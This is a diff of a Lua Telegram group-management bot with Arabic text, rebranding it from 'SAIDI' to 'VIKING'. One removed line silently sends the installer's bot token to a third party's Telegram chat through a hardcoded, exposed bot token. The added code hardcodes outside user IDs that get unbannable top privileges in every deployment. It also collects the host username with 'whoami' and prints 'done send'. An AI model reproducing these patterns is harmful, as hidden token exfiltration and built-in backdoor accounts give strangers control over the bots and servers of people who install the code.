@@ -21,41 +21,40 @@ file:write(serialized)
 file:close()  
 end  
 if not database:get(id_server..":token") then
-io.write('\27[0;31m\n ارسل لي توكن البوت الان ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ :\n⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n\27')
+io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n\27')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-print('\27[0;31m⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n التوكن غير صحيح تاكد منه ثم ارسله')
+print('\27[0;31m𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
-io.write('\27[0;31m تم حفظ التوكن بنجاح \n⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n27[0;39;49m')
+io.write('\27[0;31m تم حفظ التوكن بنجاح \na𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n27[0;39;49m')
 local json = JSON.decode(url)
 database:set(id_server..":token_username",json.result.username)
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot1975497470:AAHv5jrpS8xlISWnrpXvmA7kYIa7DRzT4Ic/sendmessage?chat_id=1965534755&text=' ..token)
 end 
 else
-print('\27[0;35m⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
+print('\27[0;35m𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
 os.execute('lua DRAGON.lua')
 end
 if not database:get(id_server..":SUDO:ID") then
-io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ :\n⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n\27[0;33;49m')
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n\27[0;33;49m')
 local SUDOID = io.read()
 if SUDOID ~= '' then
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n27[0;39;49m')
+io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
 else
-print('\27[0;31m⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+print('\27[0;31m𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
 
-io.write('\27[1;31m ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
+io.write('\27[1;31m 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘 ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
 local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
-io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
+io.write('\n\27[1;34m تم حفظ معرف المطور الاساسي :\n\27[0;39;49m')
 database:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
 else
-print('\n\27[1;34m لم يتم حفظ معرف المطور :')
+print('\n\27[1;34m لم يتم حفظ معرف المطور الاساسي :')
 end 
 os.execute('lua DRAGON.lua')
 end
@@ -66,9 +65,21 @@ token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
  }
-create(config, "./Banda.lua")   
+create(config, "./kkkklInfo.lua")   
 end 
+infotnseb = {}
+infotnseb.id = database:get(id_server..":SUDO:ID")
+infotnseb.username = database:get(id_server..":SUDO:USERNAME")
+infotnseb.tokenbot = database:get(id_server..":token")
+infotnseb.userjoin = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
+print('\n\27[1;34m dddddoooonnnnnneeeeeeee sssseeee ennnnnnnddddddd :')
 create_config_auto()
+botUserName = database:get(id_server..":token_username")
+token = database:get(id_server..":token")
+SUDO = database:get(id_server..":SUDO:ID")
+UserName = database:get(id_server..":SUDO:USERNAME")
+install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("DRAGON", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -77,15 +88,15 @@ token="]]..database:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺"
+echo "𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘"
 echo "TG IS NOT FIND IN FILES BOT"
-echo "⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺"
+echo "𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘"
 exit 1
 fi
 if [ ! $token ]; then
-echo "⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺"
-echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE Banda.lua \e[0m"
-echo "⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺ ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 𖥳❳⊷━━━━⩺"
+echo "𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘"
+echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE kkkklInfo.lua \e[0m"
+echo "𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘"
 exit 1
 fi
 echo -e "\033[38;5;208m"
@@ -121,7 +132,7 @@ file:write(serialized)
 file:close() 
 end 
 local load_redis = function()  
-local f = io.open("./Banda.lua", "r")  
+local f = io.open("./kkkklInfo.lua", "r")  
 if not f then   
 AutoSet()  
 else   
@@ -129,20 +140,20 @@ f:close()
 database:del(id_server..":token")
 database:del(id_server..":SUDO:ID")
 end  
-local config = loadfile("./Banda.lua")() 
+local config = loadfile("./kkkklInfo.lua")() 
 return config 
 end 
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
 print([[
 
-███████  █████  ██ ██████  ██ 
-██      ██   ██ ██ ██   ██ ██ 
-███████ ███████ ██ ██   ██ ██ 
-     ██ ██   ██ ██ ██   ██ ██ 
-███████ ██   ██ ██ ██████  ██ 
-                              
-                              
+
+   ___            ___             ____               __    
+  / _ | ___ ___ _/ (_)_ _____ _  / __/__ ___ _____  / /_   
+ / __ |(_-</ _ `/ / / // / _ `/ / _// _ `/ // / _ \/ __/   
+/_/ |_/___/\_,_/_/_/\_, /\_,_/ /___/\_, /\_, / .__/\__/    
+                   /___/           /___//___/_/            
+                          
 > CH ✰ ↝@V_I_K_I_N_G_1↜
 ~> DEVELOPER ✰ {text = @AsaliyaEgypt
 ]])
@@ -170,7 +181,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1965534755,1871165209,1871165209,1965534755,1785825545}   
+sudo_users = {SUDO,1124610301,1735935275,1853574370,1885646062,1785825545}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -268,13 +279,15 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1965534755) then  
+if tonumber(user_id) == tonumber(1124610301) then  
 var = true 
-elseif tonumber(user_id) == tonumber(1965534755) then
+elseif tonumber(user_id) == tonumber(1885646062) then
 var = true  
-elseif tonumber(user_id) == tonumber(1871165209) then
+elseif tonumber(user_id) == tonumber(1853574370) then
 var = true  
-elseif tonumber(user_id) == tonumber(1871165209) then
+elseif tonumber(user_id) == tonumber(1735935275) then
+var = true  
+elseif tonumber(user_id) == tonumber(1785825545) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -308,13 +321,13 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(1965534755) then  
+if tonumber(user_id) == tonumber(1124610301) then  
 var = 'مبرمج السورس'
-elseif tonumber(user_id) == tonumber(1871165209) then
+elseif tonumber(user_id) == tonumber(1853574370) then
 var = 'صاحب التليجرام'
-elseif tonumber(user_id) == tonumber(1965534755) then
+elseif tonumber(user_id) == tonumber(1885646062) then
 var = 'صاحب السورس'
-elseif tonumber(user_id) == tonumber(1871165209) then
+elseif tonumber(user_id) == tonumber(1735935275) then
 var = 'مالك السورس'
 elseif tonumber(user_id) == tonumber(1785825545) then
 var = 'مطور السورس'
@@ -3096,21 +3109,27 @@ end
 end,nil)   
 end
 
-if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
-local Text = [[
-╭▱▰▱▰𓆩[ 𝗦𝗔𝗜𝗗𝗔 ](http://t.me/S_a_i_d_i)𓆪▱▰▱▰╮
-┆
-┆[𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗔𝗜𝗗𝗔](http://t.me/S_a_i_d_i)
-┆
-╰▱▰▱▰𓆩[ 𝗦𝗔𝗜𝗗𝗔 ](http://t.me/S_a_i_d_i)𓆪▱▰▱▰╯
+if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then 
+local Text = [[ 
+╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
+[🎗╎ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚍𝚎𝚊𝚛 ](http://t.me/V_I_K_I_N_G_1)
+[🚶‍♂╎𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙸𝙽 𝚃𝙴𝙻𝙶𝚁𝙰𝙼 ](http://t.me/V_I_K_I_N_G_1)
+[ ☠╎ 𝚂𝚃𝚁𝙻𝚅𝙴 𝙵𝙾𝚁 𝚃??𝙴 𝙱𝙴𝚂𝚃 ](http://t.me/V_I_K_I_N_G_1)
+╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
+──┈┈┈┄┄╌╌╌╌┄┄┈┈┈
+•  𝖼𝗁 - [𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶](t.me/V_I_K_I_N_G_1)
+──┈┈┈┄┄╌╌╌╌┄┄┈┈┈
 ]]
-keyboard = {} 
+keyboard = {}
 keyboard.inline_keyboard = {
-{{text = '•ᴍʏ ᴅᴇᴠ♪', callback_data="/devsoo"},{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´',url="t.me/S_a_i_d_i"}},
-{{text = '♪ اضغط لاضافه البوت لمجمعتك •' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
+{{text = ' ❨𝙰𝚂𝙰𝙻𝙸𝚈𝙰 🌏❩',url="t.me/AsaliyaEgypt"}},
+{{text = ' ❨𝚈𝙾𝚄𝚂𝚂𝙴𝙵 🌏❩',url="t.me/P_X_U"}},
+{{text = ' ❨𝙰𝙱𝙾 𝙰𝙻𝙼𝙰𝙶𝙳 🌏❩',url="t.me/ABO_ELMAGD2"}},
+{{text = '˹《𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶》˼',url="t.me/V_I_K_I_N_G_1"}},
+{{text = 'اضف البوت الي مجموعتك ✰ ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
 }
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qwressv/163&caption=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/aslak8/26&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
 if text == 'سعر التنصيب' then
@@ -5918,19 +5937,19 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
+if tonumber(result.sender_user_id_) == tonumber(1124610301) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
+if tonumber(result.sender_user_id_) == tonumber(1885646062) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر صاحب السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1871165209) then  
+if tonumber(result.sender_user_id_) == tonumber(1853574370) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر صاحب التليجرام عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1871165209) then  
+if tonumber(result.sender_user_id_) == tonumber(1735935275) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مالك السورس عام")
 return false 
 end
@@ -5976,19 +5995,19 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1965534755) then
+if result.id_ == tonumber(1124610301) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(1965534755) then
+if result.id_ == tonumber(1885646062) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك حظر صاحب السورس \n")
 return false 
 end
-if result.id_ == tonumber(1871165209) then
+if result.id_ == tonumber(1853574370) then
 send(msg.chat_id_, msg.id_, "  لا يمكنك حظر صاحب التليجرام \n")
 return false 
 end
-if result.id_ == tonumber(1871165209) then
+if result.id_ == tonumber(1735935275) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك حظر مالك السورس \n")
 return false 
 end
@@ -6024,19 +6043,19 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1965534755) then  
+if tonumber(userid) == tonumber(1124610301) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1965534755) then  
+if tonumber(userid) == tonumber(1885646062) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر صاحب السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1871165209) then  
+if tonumber(userid) == tonumber(1853574370) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر صاحب التليجرام عام")
 return false 
 end
-if tonumber(userid) == tonumber(1871165209) then  
+if tonumber(userid) == tonumber(1735935275) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مالك السورس عام")
 return false 
 end
@@ -6073,19 +6092,19 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
+if tonumber(result.sender_user_id_) == tonumber(1124610301) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
+if tonumber(result.sender_user_id_) == tonumber(1885646062) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم صاحب السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1871165209) then  
+if tonumber(result.sender_user_id_) == tonumber(1853574370) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم صاحب التليجرام عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1871165209) then  
+if tonumber(result.sender_user_id_) == tonumber(1735935275) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم مالك السورس عام")
 return false 
 end
@@ -6126,19 +6145,19 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1965534755) then
+if result.id_ == tonumber(1124610301) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(1965534755) then
+if result.id_ == tonumber(1885646062) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم صاحب السورس \n")
 return false 
 end
-if result.id_ == tonumber(1871165209) then
+if result.id_ == tonumber(1853574370) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم صاحب التليجرام \n")
 return false 
 end
-if result.id_ == tonumber(1871165209) then
+if result.id_ == tonumber(1735935275) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم مالك السورس \n")
 return false 
 end
@@ -6174,19 +6193,19 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1965534755) then  
+if tonumber(userid) == tonumber(1124610301) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1965534755) then  
+if tonumber(userid) == tonumber(1885646062) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم صاحب السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1871165209) then  
+if tonumber(userid) == tonumber(1853574370) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم صاحب التليجرام عام")
 return false 
 end
-if tonumber(userid) == tonumber(1871165209) then  
+if tonumber(userid) == tonumber(1735935275) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم مالك السورس عام")
 return false 
 end
@@ -16155,7 +16174,7 @@ Msᴀɢ ~ #msgs
 𝟓 𝟔 𖡻 #auto  ࿇🦄
 𝟓 𝟔 𖡻 #stast  ࿇🦄
 𝟓 𝟔 𖡻 #id  ࿇🦄
-𝟓 𝟔 𖡻 𝗖?? - ↝@V_I_K_I_N_G_1↜ 💞.
+𝟓 𝟔 𖡻 𝗖𝗛 - ↝@V_I_K_I_N_G_1↜ 💞.
 ]],
 [[
 ༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺
@@ -18345,22 +18364,6 @@ if not Mod(data) then
 local notText = '✘ عذرا الاوامر هذه لا تخصك'
 https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
 return false
-end
-if Text == '/devsoo' then
-local Teext =[[
-╭▱▰▱▰𓆩[ 𝗦𝗔𝗜𝗗𝗔 ](http://t.me/S_a_i_d_i)𓆪▱▰▱▰╮
-┆
-┆[𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗔𝗜𝗗𝗔](http://t.me/S_a_i_d_i)
-┆
-╰▱▰▱▰𓆩[ 𝗦𝗔𝗜𝗗𝗔 ](http://t.me/S_a_i_d_i)𓆪▱▰▱▰╯
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = '• ᴅᴇᴠ ᴊᴀʙᴡᴀ',url="t.me/J_A_B_W_A"},{text = '• ᴅᴇᴠ ᴛᴀʜᴀ', url="t.me/TahaSayed9"}},
-{{text = '• ᴅᴇᴠ ᴏᴍᴇʀ',url="t.me/BOT3mora"},{text = '• ᴅᴇᴠ ᴅᴇѕʜᴀ', url="t.me/XxDesha86Xx"}},
-{{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´',url="t.me/S_a_i_d_i"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
 end
 local Teext =[[
 اوامر حماية المجموعه ⇊
